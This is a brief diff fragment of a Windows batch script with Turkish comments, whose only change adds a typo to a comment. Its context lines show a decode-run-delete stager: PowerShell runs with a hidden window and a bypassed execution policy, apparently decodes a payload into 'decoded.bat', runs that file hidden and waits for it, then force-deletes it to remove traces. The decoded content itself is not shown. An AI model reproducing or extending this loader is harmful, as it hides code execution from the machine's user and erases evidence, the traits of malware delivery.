@@ -9,7 +9,7 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[Sys
 :: decoded.bat dosyasını gizli şekilde çalıştır ve bitmesini bekle
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'decoded.bat' -WindowStyle Hidden -Wait"
 
-:: çalıştıktan sonra sil
+:: çalıştıktan sonra sill
 del /f /q decoded.bat
 
 exit
